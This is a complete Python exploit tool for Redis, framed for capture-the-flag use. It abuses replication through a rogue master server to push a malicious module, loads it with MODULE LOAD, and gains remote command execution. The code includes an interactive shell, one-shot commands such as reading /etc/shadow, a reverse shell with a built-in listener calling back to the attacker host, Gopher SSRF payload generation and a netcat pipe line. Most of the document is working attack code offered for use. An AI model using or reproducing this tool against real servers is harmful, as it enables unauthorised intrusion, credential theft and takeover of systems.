#!/usr/bin/env python3
"""
redis-rogue-pwn.py — Enhanced Redis Rogue Server for CTF engagements

Exploits Redis <= 5.0.5 (and often later) via the replication MODULE LOAD
chain: SLAVEOF → push malicious .so via PSYNC → MODULE LOAD → RCE.

Improvements over n0b0dyCN/redis-rogue-server:
  • One-shot command execution (--cmd / -x)
  • Built-in reverse shell listener (--rev-listen)
  • SSRF / Gopher payload generation (--gen-gopher)
  • Proper RESP protocol parsing
  • Auto-recon (fingerprint Redis version, config, loaded modules)
  • Timeouts, retries, and robust cleanup
  • Server-only mode for blind/SSRF scenarios
  • Custom dbfilename / module load path
  • No hardcoded sleeps — poll-based sync detection
  • Auth support (password & ACL user:pass)
  • Colored logging with verbosity levels

Usage examples:

  # Interactive shell
  python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2

  # One-shot command
  python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 -x 'id; cat /root/root.txt'

  # Reverse shell with built-in listener
  python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 --rev 10.10.14.2:9001 --rev-listen

  # With auth
  python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 -a 'P@ssw0rd' -x 'whoami'

  # ACL auth (Redis 6+)
  python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 --user admin -a 'P@ss' -x 'whoami'

  # Server-only (for SSRF/blind — you trigger SLAVEOF externally)
  python3 redis-rogue-pwn.py --server-only -l 0.0.0.0 --lport 21000

  # Generate Gopher SSRF payloads (for web→Redis chains)
  python3 redis-rogue-pwn.py --gen-gopher -t 127.0.0.1 -l 10.10.14.2

  # Recon only (fingerprint, don't exploit)
  python3 redis-rogue-pwn.py -t 10.10.10.5 --recon
"""

import argparse
import os
import re
import select
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
from pathlib import Path


# ─── ANSI colors ────────────────────────────────────────────────────────────
class C:
    RST  = "\033[0m"
    BOLD = "\033[1m"
    RED  = "\033[91m"
    GRN  = "\033[92m"
    YEL  = "\033[93m"
    BLU  = "\033[94m"
    MAG  = "\033[95m"
    CYN  = "\033[96m"
    DIM  = "\033[2m"

def info(msg):    print(f"{C.BLU}[*]{C.RST} {msg}")
def good(msg):    print(f"{C.GRN}[+]{C.RST} {msg}")
def warn(msg):    print(f"{C.YEL}[!]{C.RST} {msg}")
def fail(msg):    print(f"{C.RED}[-]{C.RST} {msg}")
def dbg(msg):
    if VERBOSE:
        print(f"{C.DIM}[D] {msg}{C.RST}")


VERBOSE = False
TIMEOUT = 8  # default socket timeout (seconds)


# ─── RESP Protocol helpers ──────────────────────────────────────────────────

def resp_encode(args: list) -> bytes:
    """Encode a list of strings/bytes into RESP array format."""
    parts = [f"*{len(args)}\r\n"]
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        parts.append(f"${len(a)}\r\n".encode() if isinstance(parts[-1], bytes) else f"${len(a)}\r\n")
    # rebuild cleanly
    buf = f"*{len(args)}\r\n".encode()
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        buf += f"${len(a)}\r\n".encode() + a + b"\r\n"
    return buf


def resp_decode_line(sock, timeout=TIMEOUT) -> str:
    """Read one RESP line from socket. Returns decoded string."""
    sock.settimeout(timeout)
    buf = b""
    try:
        while not buf.endswith(b"\r\n"):
            chunk = sock.recv(1)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf.decode(errors="replace").strip()


def resp_read_bulk(sock, timeout=TIMEOUT) -> bytes:
    """Read a complete RESP response (handles +, -, :, $, * types)."""
    sock.settimeout(timeout)
    buf = b""
    try:
        # Read first line
        while not buf.endswith(b"\r\n"):
            chunk = sock.recv(1)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        return buf

    first_line = buf.decode(errors="replace").strip()

    if not first_line:
        return buf

    prefix = first_line[0]

    # Simple string, error, integer
    if prefix in ('+', '-', ':'):
        return buf

    # Bulk string
    if prefix == '$':
        length = int(first_line[1:])
        if length == -1:
            return buf  # null bulk
        remaining = length + 2 - 0  # +2 for trailing \r\n
        data = b""
        while len(data) < remaining:
            try:
                chunk = sock.recv(remaining - len(data))
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        return buf + data

    # Array — read recursively (simplified: just grab everything available)
    if prefix == '*':
        count = int(first_line[1:])
        if count <= 0:
            return buf
        result = buf
        for _ in range(count):
            element = resp_read_bulk(sock, timeout)
            result += element
        return result

    return buf


def resp_read_all(sock, timeout=2) -> str:
    """Read all available data from socket with a short timeout."""
    sock.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf.decode(errors="replace")


# ─── Redis Client ───────────────────────────────────────────────────────────

class RedisConn:
    """Lightweight Redis client with RESP protocol support."""

    def __init__(self, host, port, password=None, username=None, timeout=TIMEOUT):
        self.host = host
        self.port = port
        self.password = password
        self.username = username
        self.timeout = timeout
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        try:
            self.sock.connect((self.host, self.port))
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            fail(f"Connection to {self.host}:{self.port} failed: {e}")
            return False
        good(f"Connected to {self.host}:{self.port}")

        # Authenticate if needed
        if self.password:
            if self.username:
                resp = self.cmd("AUTH", self.username, self.password)
            else:
                resp = self.cmd("AUTH", self.password)
            if "OK" not in resp and "ERR" in resp:
                fail(f"AUTH failed: {resp}")
                return False
            good("Authenticated successfully")

        return True

    def cmd(self, *args) -> str:
        """Send a command and return the response as string."""
        raw = resp_encode(list(args))
        dbg(f"TX → {args}")
        self.sock.sendall(raw)
        resp = resp_read_all(self.sock, timeout=self.timeout)
        dbg(f"RX ← {resp[:200]}{'...' if len(resp) > 200 else ''}")
        return resp

    def cmd_raw(self, *args) -> bytes:
        """Send a command and return raw bytes."""
        raw = resp_encode(list(args))
        self.sock.sendall(raw)
        return resp_read_bulk(self.sock, timeout=self.timeout)

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

    def extract_bulk_string(self, resp: str) -> str:
        """Extract the value from a RESP bulk string response."""
        lines = resp.strip().split("\r\n")
        results = []
        i = 0
        while i < len(lines):
            if lines[i].startswith("$") and lines[i] != "$-1":
                if i + 1 < len(lines):
                    results.append(lines[i + 1])
                    i += 2
                    continue
            elif lines[i].startswith("+"):
                results.append(lines[i][1:])
            elif lines[i].startswith("-"):
                results.append(lines[i])
            i += 1
        return "\n".join(results) if results else resp.strip()

    def config_get(self, key: str) -> str:
        """Get a Redis config value."""
        resp = self.cmd("CONFIG", "GET", key)
        # Response is an array: [key_name, value]
        lines = resp.strip().split("\r\n")
        for i, line in enumerate(lines):
            if line.startswith("$") and line != "$-1":
                if i + 1 < len(lines) and lines[i + 1] != key:
                    return lines[i + 1]
                elif i + 1 < len(lines):
                    # first match is key name, second is value
                    if i + 2 < len(lines) and lines[i + 2].startswith("$"):
                        if i + 3 < len(lines):
                            return lines[i + 3]
        # fallback: return last bulk string value
        for i in range(len(lines) - 1, -1, -1):
            if not lines[i].startswith(("*", "$", "+", "-", ":")):
                return lines[i]
        return ""


# ─── Rogue RESP Server ──────────────────────────────────────────────────────

class RogueServer:
    """Rogue Redis server that serves a malicious .so via replication."""

    def __init__(self, host, port, payload_data: bytes):
        self.host = host
        self.port = port
        self.payload = payload_data
        self.sock = None

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.sock.bind((self.host, self.port))
        except OSError as e:
            fail(f"Cannot bind rogue server on {self.host}:{self.port}: {e}")
            return False
        self.sock.listen(1)
        self.sock.settimeout(30)
        info(f"Rogue server listening on {self.host}:{self.port}")
        return True

    def handle_replication(self):
        """Accept one connection and serve the payload via PSYNC."""
        try:
            cli, addr = self.sock.accept()
            info(f"Incoming replication from {addr[0]}:{addr[1]}")
        except socket.timeout:
            fail("Timed out waiting for replication connection")
            return False

        cli.settimeout(15)

        try:
            while True:
                data = cli.recv(4096)
                if not data:
                    break
                decoded = data.decode(errors="replace")
                dbg(f"Rogue RX: {decoded.strip()[:120]}")

                if "PING" in decoded:
                    cli.sendall(b"+PONG\r\n")
                    dbg("Rogue TX: +PONG")
                elif "AUTH" in decoded:
                    cli.sendall(b"+OK\r\n")
                    dbg("Rogue TX: +OK (AUTH)")
                elif "REPLCONF" in decoded:
                    cli.sendall(b"+OK\r\n")
                    dbg("Rogue TX: +OK (REPLCONF)")
                elif "PSYNC" in decoded or "SYNC" in decoded:
                    # Send FULLRESYNC + payload as RDB
                    header = f"+FULLRESYNC {'Z' * 40} 1\r\n"
                    header += f"${len(self.payload)}\r\n"
                    cli.sendall(header.encode() + self.payload + b"\r\n")
                    info(f"Payload delivered ({len(self.payload)} bytes)")
                    break
                else:
                    # Unknown — reply OK and continue
                    cli.sendall(b"+OK\r\n")
        except Exception as e:
            fail(f"Rogue server error: {e}")
            return False
        finally:
            cli.close()

        return True

    def stop(self):
        if self.sock:
            try:
                self.sock.close()
            except:
                pass


# ─── Exploit Logic ───────────────────────────────────────────────────────────

def recon(rc: RedisConn):
    """Fingerprint the target Redis instance."""
    print()
    info(f"{C.BOLD}═══ Redis Recon ═══{C.RST}")

    # INFO server
    resp = rc.cmd("INFO", "server")
    version = "?"
    os_info = "?"
    tcp_port = "?"
    config_file = "?"
    for line in resp.split("\r\n"):
        if line.startswith("redis_version:"):
            version = line.split(":", 1)[1]
        elif line.startswith("os:"):
            os_info = line.split(":", 1)[1]
        elif line.startswith("tcp_port:"):
            tcp_port = line.split(":", 1)[1]
        elif line.startswith("config_file:"):
            config_file = line.split(":", 1)[1]

    info(f"Version:     {C.CYN}{version}{C.RST}")
    info(f"OS:          {os_info}")
    info(f"Port:        {tcp_port}")
    info(f"Config file: {config_file}")

    # CONFIG
    dbdir = rc.config_get("dir")
    dbfile = rc.config_get("dbfilename")
    info(f"dir:         {dbdir}")
    info(f"dbfilename:  {dbfile}")

    # Check if MODULE command is available
    resp = rc.cmd("MODULE", "LIST")
    if "ERR" in resp and "unknown command" in resp.lower():
        warn("MODULE command not available (might be renamed or disabled)")
    else:
        modules = []
        lines = resp.strip().split("\r\n")
        for i, line in enumerate(lines):
            if line == "name" or (i > 0 and lines[i-1].startswith("$") and line == "name"):
                pass  # skip key
            # Simple extraction: find module names
        info(f"Loaded modules: {resp.strip()[:100] if 'ERR' not in resp else 'none'}")

    # Check slave status
    resp = rc.cmd("INFO", "replication")
    for line in resp.split("\r\n"):
        if line.startswith("role:"):
            info(f"Role:        {line.split(':', 1)[1]}")

    # Check protected mode
    resp = rc.cmd("CONFIG", "GET", "protected-mode")
    pm = rc.config_get("protected-mode") if "ERR" not in resp else "?"
    info(f"Protected:   {pm}")

    print()
    return version, dbdir, dbfile


def do_exploit(args, payload_data: bytes):
    """Main exploit chain."""

    rc = RedisConn(args.target, args.rport, password=args.auth, username=args.user,
                   timeout=args.timeout)
    if not rc.connect():
        return False

    # ── Phase 1: Recon ──
    version, orig_dir, orig_dbfile = recon(rc)

    if args.recon:
        rc.close()
        return True

    # Sanity check
    major = 0
    try:
        major = int(version.split(".")[0])
    except:
        pass
    if major >= 6:
        warn(f"Redis {version} detected — MODULE LOAD may require ACL permissions")

    # ── Phase 2: Setup replication ──
    module_name = args.module_name  # filename on disk
    module_dir = orig_dir  # write to same dir as current dbdir

    info("Setting up replication...")
    resp = rc.cmd("SLAVEOF", args.lhost, str(args.lport))
    if "OK" not in resp:
        fail(f"SLAVEOF failed: {resp}")
        rc.close()
        return False
    good("SLAVEOF set — target will connect to our rogue server")

    # Set dbfilename to our module name
    resp = rc.cmd("CONFIG", "SET", "dbfilename", module_name)
    if "OK" not in resp:
        fail(f"CONFIG SET dbfilename failed: {resp}")
        cleanup(rc, orig_dbfile, None, skip_unload=True)
        return False

    # ── Phase 3: Serve payload via rogue server ──
    rogue = RogueServer(args.bind, args.lport, payload_data)
    if not rogue.start():
        cleanup(rc, orig_dbfile, None, skip_unload=True)
        return False

    # Wait for replication connection
    info("Waiting for target to replicate...")
    if not rogue.handle_replication():
        fail("Replication failed")
        rogue.stop()
        cleanup(rc, orig_dbfile, None, skip_unload=True)
        return False
    rogue.stop()

    # Give target a moment to write the file
    time.sleep(1)

    # ── Phase 4: Load module ──
    module_path = f"{module_dir}/{module_name}"
    info(f"Loading module from {module_path}")

    # Disconnect from master first
    rc.cmd("SLAVEOF", "NO", "ONE")
    time.sleep(0.5)

    resp = rc.cmd("MODULE", "LOAD", module_path)
    if "OK" not in resp and "ERR" in resp:
        # Sometimes module is already loaded
        if "already" in resp.lower():
            warn("Module already loaded — continuing")
        else:
            fail(f"MODULE LOAD failed: {resp}")
            cleanup(rc, orig_dbfile, module_path, skip_unload=True)
            return False
    else:
        good("Module loaded — RCE achieved!")

    # Restore dbfilename immediately
    rc.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)

    # ── Phase 5: Execute ──
    if args.cmd:
        # One-shot command mode
        do_exec(rc, args.cmd)
    elif args.rev:
        # Reverse shell mode
        do_reverse_shell(rc, args.rev, args.rev_listen)
    else:
        # Interactive mode
        do_interactive(rc)

    # ── Phase 6: Cleanup ──
    cleanup(rc, orig_dbfile, module_path)
    return True


def do_exec(rc: RedisConn, cmd: str):
    """Execute a single command via system.exec and print output."""
    info(f"Executing: {cmd}")
    resp = rc.cmd("system.exec", cmd)
    output = extract_exec_output(resp)
    print(f"\n{C.GRN}{output}{C.RST}\n")


def do_interactive(rc: RedisConn):
    """Interactive shell loop via system.exec."""
    good("Interactive shell — type 'exit' or Ctrl+C to quit")
    print()
    try:
        while True:
            try:
                cmd = input(f"{C.RED}redis-pwn{C.RST}> ").strip()
            except EOFError:
                break
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit", "q"):
                break
            resp = rc.cmd("system.exec", cmd)
            output = extract_exec_output(resp)
            if output:
                print(output)
    except KeyboardInterrupt:
        print()
    print()


def do_reverse_shell(rc: RedisConn, rev_target: str, listen: bool):
    """Trigger a reverse shell via system.rev."""
    parts = rev_target.rsplit(":", 1)
    if len(parts) != 2:
        fail("--rev format must be IP:PORT")
        return
    rev_host, rev_port = parts[0], parts[1]

    if listen:
        # Start listener in background thread
        info(f"Starting reverse shell listener on {rev_host}:{rev_port}")
        listener_thread = threading.Thread(
            target=reverse_listener, args=(rev_host, int(rev_port)),
            daemon=True
        )
        listener_thread.start()
        time.sleep(1)

    info(f"Sending reverse shell to {rev_host}:{rev_port}")
    rc.cmd("system.rev", rev_host, rev_port)
    good("Reverse shell payload sent!")

    if listen:
        info("Waiting for shell (Ctrl+C to abort)...")
        try:
            listener_thread.join()
        except KeyboardInterrupt:
            pass


def reverse_listener(host: str, port: int):
    """Simple reverse shell listener."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", port))
    except OSError as e:
        fail(f"Cannot bind listener on 0.0.0.0:{port}: {e}")
        return
    srv.listen(1)
    srv.settimeout(30)

    try:
        cli, addr = srv.accept()
        good(f"Shell from {addr[0]}:{addr[1]}!")
        print(f"{C.DIM}{'─' * 50}{C.RST}")

        cli.settimeout(0.5)
        while True:
            # Read output
            ready, _, _ = select.select([cli, sys.stdin], [], [], 0.5)
            for s in ready:
                if s is cli:
                    try:
                        data = cli.recv(4096)
                        if not data:
                            info("Connection closed")
                            return
                        sys.stdout.write(data.decode(errors="replace"))
                        sys.stdout.flush()
                    except:
                        pass
                elif s is sys.stdin:
                    line = sys.stdin.readline()
                    if not line:
                        return
                    cli.sendall(line.encode())
    except socket.timeout:
        fail("No reverse shell connection received within 30s")
    except KeyboardInterrupt:
        pass
    finally:
        srv.close()


def extract_exec_output(resp: str) -> str:
    """Extract command output from system.exec RESP response."""
    lines = resp.strip().split("\r\n")
    results = []
    i = 0
    while i < len(lines):
        if lines[i].startswith("$"):
            try:
                length = int(lines[i][1:])
                if length > 0 and i + 1 < len(lines):
                    results.append(lines[i + 1])
                    i += 2
                    continue
            except ValueError:
                pass
        elif not lines[i].startswith(("*", "+", "-", ":")):
            results.append(lines[i])
        i += 1
    return "\n".join(results)


def cleanup(rc: RedisConn, orig_dbfile: str, module_path: str = None, skip_unload=False):
    """Restore Redis to its original state."""
    info("Cleaning up...")
    try:
        rc.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
        rc.cmd("SLAVEOF", "NO", "ONE")
        if module_path and not skip_unload:
            rc.cmd("system.exec", f"rm -f {module_path}")
            rc.cmd("MODULE", "UNLOAD", "system")
            good("Module unloaded and .so removed")
    except Exception as e:
        warn(f"Cleanup error (non-fatal): {e}")
    finally:
        rc.close()


# ─── Server-Only Mode ───────────────────────────────────────────────────────

def server_only(args, payload_data: bytes):
    """Start rogue server only — for SSRF/blind scenarios where you trigger
    SLAVEOF externally."""
    info(f"{C.BOLD}Server-only mode{C.RST}")
    info("Trigger these commands on the target Redis:")
    print(f"""
  {C.CYN}SLAVEOF {args.lhost} {args.lport}{C.RST}
  {C.CYN}CONFIG SET dbfilename exp.so{C.RST}
  {C.DIM}  ... wait for sync ...{C.RST}
  {C.CYN}SLAVEOF NO ONE{C.RST}
  {C.CYN}MODULE LOAD /path/to/exp.so{C.RST}
  {C.CYN}system.exec "id"{C.RST}
""")

    rogue = RogueServer(args.bind, args.lport, payload_data)
    if not rogue.start():
        return False

    info("Waiting for victim to connect...")
    result = rogue.handle_replication()
    rogue.stop()

    if result:
        good("Payload delivered! Now MODULE LOAD on target.")
    return result


# ─── Gopher / SSRF Payload Generation ───────────────────────────────────────

def gen_gopher(args):
    """Generate Gopher SSRF payloads for the full exploit chain.
    Useful when you have a web SSRF to Redis (e.g., via curl, file_get_contents)."""

    info(f"{C.BOLD}═══ Gopher SSRF Payload Generator ═══{C.RST}")
    print()

    target = args.target or "127.0.0.1"
    port = args.rport
    module_name = args.module_name

    # Step 1: SLAVEOF
    info("Step 1 — SLAVEOF (make target replicate from your rogue server)")
    cmds_slave = [
        resp_encode(["SLAVEOF", args.lhost, str(args.lport)]),
        resp_encode(["CONFIG", "SET", "dbfilename", module_name]),
    ]
    if args.auth:
        if args.user:
            cmds_slave.insert(0, resp_encode(["AUTH", args.user, args.auth]))
        else:
            cmds_slave.insert(0, resp_encode(["AUTH", args.auth]))

    slave_payload = b"".join(cmds_slave)
    gopher_slave = gopher_encode(target, port, slave_payload)
    print(f"  {C.CYN}{gopher_slave}{C.RST}")
    print()

    # Step 2: Wait + start rogue server
    info("Step 2 — Start rogue server, then replay step 1 SSRF to trigger sync")
    print(f"  {C.YEL}python3 redis-rogue-pwn.py --server-only -l {args.lhost} --lport {args.lport}{C.RST}")
    print()

    # Step 3: MODULE LOAD
    info("Step 3 — Load module after sync completes")
    cmds_load = []
    if args.auth:
        if args.user:
            cmds_load.append(resp_encode(["AUTH", args.user, args.auth]))
        else:
            cmds_load.append(resp_encode(["AUTH", args.auth]))
    cmds_load.extend([
        resp_encode(["SLAVEOF", "NO", "ONE"]),
        resp_encode(["MODULE", "LOAD", f"./{module_name}"]),
    ])
    load_payload = b"".join(cmds_load)
    gopher_load = gopher_encode(target, port, load_payload)
    print(f"  {C.CYN}{gopher_load}{C.RST}")
    print()

    # Step 4: Command exec
    info("Step 4 — Execute commands")
    cmd_str = args.cmd or "id"
    cmds_exec = []
    if args.auth:
        if args.user:
            cmds_exec.append(resp_encode(["AUTH", args.user, args.auth]))
        else:
            cmds_exec.append(resp_encode(["AUTH", args.auth]))
    cmds_exec.append(resp_encode(["system.exec", cmd_str]))
    exec_payload = b"".join(cmds_exec)
    gopher_exec = gopher_encode(target, port, exec_payload)
    print(f"  {C.CYN}{gopher_exec}{C.RST}")
    print()

    # Step 5: Cleanup
    info("Step 5 — Cleanup (optional)")
    cmds_clean = []
    if args.auth:
        if args.user:
            cmds_clean.append(resp_encode(["AUTH", args.user, args.auth]))
        else:
            cmds_clean.append(resp_encode(["AUTH", args.auth]))
    cmds_clean.extend([
        resp_encode(["system.exec", f"rm -f ./{module_name}"]),
        resp_encode(["MODULE", "UNLOAD", "system"]),
    ])
    clean_payload = b"".join(cmds_clean)
    gopher_clean = gopher_encode(target, port, clean_payload)
    print(f"  {C.CYN}{gopher_clean}{C.RST}")
    print()

    # Also output raw RESP for curl/netcat
    info("Raw RESP for manual use (pipe into nc/redis-cli --pipe):")
    print(f"  {C.DIM}echo -ne '{resp_escape(slave_payload)}' | nc {target} {port}{C.RST}")
    print()


def gopher_encode(host: str, port: int, data: bytes) -> str:
    """Encode raw bytes into a gopher:// URL."""
    encoded = urllib.parse.quote(data, safe='')
    return f"gopher://{host}:{port}/_{encoded}"


def resp_escape(data: bytes) -> str:
    """Escape bytes for echo -ne."""
    result = []
    for b in data:
        if 0x20 <= b < 0x7f and b != 0x5c and b != 0x22 and b != 0x27:
            result.append(chr(b))
        else:
            result.append(f"\\x{b:02x}")
    return "".join(result)


# ─── Main ────────────────────────────────────────────────────────────────────

BANNER = f"""{C.RED}
  ┌─────────────────────────────────────────────────┐
  │  {C.BOLD}Redis Rogue PWN{C.RST}{C.RED}  —  Enhanced for CTF            │
  │  Replication + MODULE LOAD → RCE                │
  │  Based on n0b0dyCN/redis-rogue-server            │
  └─────────────────────────────────────────────────┘{C.RST}
"""


def main():
    global VERBOSE, TIMEOUT

    parser = argparse.ArgumentParser(
        description="Redis Rogue Server — Enhanced CTF Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  %(prog)s -t 10.10.10.5 -l 10.10.14.2                     # interactive shell
  %(prog)s -t 10.10.10.5 -l 10.10.14.2 -x 'cat /etc/shadow' # one-shot
  %(prog)s -t 10.10.10.5 -l 10.10.14.2 --rev 10.10.14.2:9001 --rev-listen
  %(prog)s -t 10.10.10.5 --recon                             # fingerprint only
  %(prog)s --server-only -l 0.0.0.0 --lport 21000            # serve payload
  %(prog)s --gen-gopher -t 127.0.0.1 -l 10.10.14.2           # SSRF payloads
        """
    )

    # Target
    parser.add_argument("-t", "--target", dest="target",
                        help="Target Redis host")
    parser.add_argument("-p", "--rport", dest="rport", type=int, default=6379,
                        help="Target Redis port (default: 6379)")

    # Auth
    parser.add_argument("-a", "--auth", dest="auth",
                        help="Redis password (or ACL password with --user)")
    parser.add_argument("--user", dest="user",
                        help="Redis ACL username (Redis 6+)")

    # Rogue server
    parser.add_argument("-l", "--lhost", dest="lhost",
                        help="Rogue server IP (your attack box, reachable from target)")
    parser.add_argument("--lport", dest="lport", type=int, default=21000,
                        help="Rogue server port (default: 21000)")
    parser.add_argument("--bind", dest="bind", default="0.0.0.0",
                        help="Rogue server bind address (default: 0.0.0.0)")

    # Payload
    parser.add_argument("-e", "--exp", dest="exp_file", default="exp.so",
                        help="Path to malicious Redis module .so (default: exp.so)")
    parser.add_argument("--module-name", dest="module_name", default="exp.so",
                        help="Filename to write on target (default: exp.so)")

    # Execution mode
    parser.add_argument("-x", "--cmd", dest="cmd",
                        help="One-shot command to execute (non-interactive)")
    parser.add_argument("--rev", dest="rev",
                        help="Reverse shell target IP:PORT (uses system.rev)")
    parser.add_argument("--rev-listen", dest="rev_listen", action="store_true",
                        help="Start a built-in reverse shell listener")

    # Modes
    parser.add_argument("--recon", dest="recon", action="store_true",
                        help="Recon only — fingerprint target, don't exploit")
    parser.add_argument("--server-only", dest="server_only", action="store_true",
                        help="Start rogue server only (for SSRF/blind scenarios)")
    parser.add_argument("--gen-gopher", dest="gen_gopher", action="store_true",
                        help="Generate Gopher SSRF payloads for the exploit chain")

    # Options
    parser.add_argument("--timeout", dest="timeout", type=int, default=8,
                        help="Socket timeout in seconds (default: 8)")
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true",
                        help="Verbose output (show RESP traffic)")

    args = parser.parse_args()
    VERBOSE = args.verbose
    TIMEOUT = args.timeout

    print(BANNER)

    # ── Gopher mode (doesn't need payload file) ──
    if args.gen_gopher:
        if not args.target:
            args.target = "127.0.0.1"
        if not args.lhost:
            parser.error("--gen-gopher requires -l/--lhost")
        gen_gopher(args)
        return

    # ── Recon-only mode ──
    if args.recon:
        if not args.target:
            parser.error("--recon requires -t/--target")
        rc = RedisConn(args.target, args.rport, password=args.auth,
                       username=args.user, timeout=args.timeout)
        if rc.connect():
            recon(rc)
            rc.close()
        return

    # ── Load payload ──
    exp_path = Path(args.exp_file)
    if not exp_path.exists():
        # Try alongside this script
        script_dir = Path(__file__).parent
        alt = script_dir / args.exp_file
        if alt.exists():
            exp_path = alt
        else:
            fail(f"Payload not found: {args.exp_file}")
            fail("Compile from RedisModulesSDK/exp/ or provide path with -e")
            sys.exit(1)

    payload_data = exp_path.read_bytes()
    info(f"Loaded payload: {exp_path} ({len(payload_data)} bytes)")

    # ── Server-only mode ──
    if args.server_only:
        if not args.lhost:
            args.lhost = "0.0.0.0"
        server_only(args, payload_data)
        return

    # ── Full exploit ──
    if not args.target:
        parser.error("Target (-t) is required")
    if not args.lhost:
        parser.error("Rogue server IP (-l) is required")

    try:
        success = do_exploit(args, payload_data)
        if success:
            good("Done!")
        else:
            fail("Exploit failed")
            sys.exit(1)
    except KeyboardInterrupt:
        warn("\nAborted")
        sys.exit(130)
    except Exception as e:
        fail(f"Unhandled error: {e}")
        if VERBOSE:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
